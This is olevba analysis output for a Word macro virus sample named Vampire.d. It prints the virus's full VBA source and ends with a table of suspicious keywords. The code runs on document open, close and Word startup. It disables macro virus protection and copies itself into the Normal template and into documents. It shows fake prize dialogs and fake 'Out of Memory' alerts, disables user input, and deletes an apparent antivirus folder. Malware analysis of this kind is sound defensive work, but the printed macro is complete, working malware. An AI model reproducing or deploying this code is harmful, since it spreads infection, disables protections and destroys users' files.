olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vampire.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vampire.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Vampire.bas 
in file: Virus.MSWord.Vampire.d - OLE stream: 'Macros/VBA/Vampire'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
Attribute autoclose.VB_Description = "巨集建立於 97/09/15，建立者 AJB"
Attribute autoclose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Vampire"
' 巨集建立於 97/09/15，建立者 gdh
'
Dim AVA
On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Vampire" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Vampire" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

AVA = WordBasic.Int(Rnd() * 20) + 1
If AVA = 13 Then
WordBasic.Call "VM"
WordBasic.Call "VM2"
End If

exit_:


End Sub
Sub autoexec()
Dim TC
On Error Resume Next
WordBasic.Call "pire"

TC = WordBasic.Int(Rnd() * 30) + 1
If TC = 11 Or TC = 15 Or TC = 21 Or TC = 25 Or TC = 31 Then
WordBasic.Call "VM1"
WordBasic.Call "VM3"
WordBasic.Call "Vampire2"
End If

End Sub
Sub autoopen()
On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Vampire" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Vampire" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Vampire", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

exit_:
End Sub
Sub Vampire2()
Dim push1
Dim T1$
Dim T2$
Dim T2_
On Error Resume Next

VMP

WordBasic.BeginDialog 180, 78, "WM Vampire97"
    WordBasic.Text 9, 9, 160, 13, "   告訴您一個好消息", "Text1"
    WordBasic.Text 27, 28, 122, 13, "恭喜!您中獎了!!", "Text2"
    WordBasic.PushButton 43, 48, 88, 21, "確定", "push1"
WordBasic.EndDialog

Dim Vampire As Object: Set Vampire = WordBasic.CurValues.UserDialog
push1 = WordBasic.Dialog.UserDialog(Vampire, -1, 2500)
T1$ = WordBasic.[Left$](WordBasic.[CTime$](7), 2)
T2$ = WordBasic.[Right$](WordBasic.[CTime$](7), 2)
T2_ = WordBasic.Val(T2$)
T2_ = T2_ + 1
T2$ = Str(T2_)
WordBasic.OnTime T1$ + ":" + T2$, "Vampire2"

exit_:



End Sub
Private Sub VMP()
Dim R
Dim a$
Dim B$
Dim C$
Dim D$
WordBasic.DisableInput 1
On Error Resume Next
R = 0
start:
a$ = "照過來!照過來!!"
B$ = "告訴你一個密秘!!"
C$ = "看清楚喔!!"
D$ = "你中獎了!!"
WordBasic.Bold 1: WordBasic.Italic 1: WordBasic.Underline 1
WordBasic.Insert a$ + Chr(9)
WordBasic.Bold 0: WordBasic.Italic 0: WordBasic.Underline 0
WordBasic.Insert B$ + Chr(9)
WordBasic.Bold 1: WordBasic.Italic 1: WordBasic.Underline 1
WordBasic.Insert C$ + Chr(9)
WordBasic.Bold 0: WordBasic.Italic 0: WordBasic.Underline 0
WordBasic.Insert D$
WordBasic.InsertPara
R = R + 1
If R > 3 Then GoTo exit_
GoTo start

exit_:

End Sub
Sub FileTemplates()
Dim W
WordBasic.DisableInput 1
On Error Resume Next
W = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.Call "Pire.VM1"
End If
WordBasic.Beep
WordBasic.MsgBox " Out of Memory", "Microsoft Visual Basic", 48
exit_:


End Sub
Sub toolsmacro()
Dim W
WordBasic.DisableInput 1
On Error Resume Next
W = WordBasic.Int(Rnd() * 7) + 1
If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Or WordBasic.WeekDay(WordBasic.Now()) = W Then
WordBasic.Call "Pire.VM1"
End If
WordBasic.Beep
WordBasic.MsgBox " Out of Memory", "Microsoft Visual Basic", 48
exit_:

End Sub

Sub pire()
KZ
End Sub
Private Sub KZ()
On Error Resume Next
Err.Number = 0
WordBasic.Kill "c:\zlockav\*.*"
WordBasic.RmDir "c:\zlockav"
exit_:

End Sub

Private Sub VM()
Dim CD
Dim L
Dim la$
Dim lam$

On Error Resume Next

lamo:
On Error Resume Next
CD = WordBasic.CountDirectories("C:\")
For L = 1 To CD
la$ = "C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*"
lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*")
If lam$ = "" Then GoTo NE
WordBasic.Beep

NE:
Next L

exit_:

End Sub


Private Sub VM1()
Dim R
Dim CD1
Dim L
Dim la$
Dim lam$
R = 0
On Error Resume Next

lamoa:
CD1 = WordBasic.CountDirectories("C:\")
For L = 1 To CD1
la$ = "C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*"
lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*")
If lam$ = "" Then GoTo NE
WordBasic.Beep

NE:
Next L

exit_:

R = R + 1
If R <= 7 Then GoTo lamoa

End Sub

Private Sub VM2()
Dim CD2
Dim L
Dim la$
Dim lam$
On Error Resume Next
lamob:
On Error Resume Next
CD2 = WordBasic.CountDirectories("D:\")
For L = 1 To CD2
la$ = "D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*"
lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*")
If lam$ = "" Then GoTo NE
WordBasic.Beep

NE:
Next L

exit_:

End Sub

Private Sub VM3()
Dim R
Dim CD3
Dim L
Dim la$
Dim lam$
R = 0
On Error Resume Next

lamoc:
CD3 = WordBasic.CountDirectories("D:\")
For L = 1 To CD3
la$ = "D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*"
lam$ = WordBasic.[Files$]("D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*")
If lam$ = "" Then GoTo NE
WordBasic.Beep

NE:
Next L

exit_:

R = R + 1
If R <= 7 Then GoTo lamoc

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

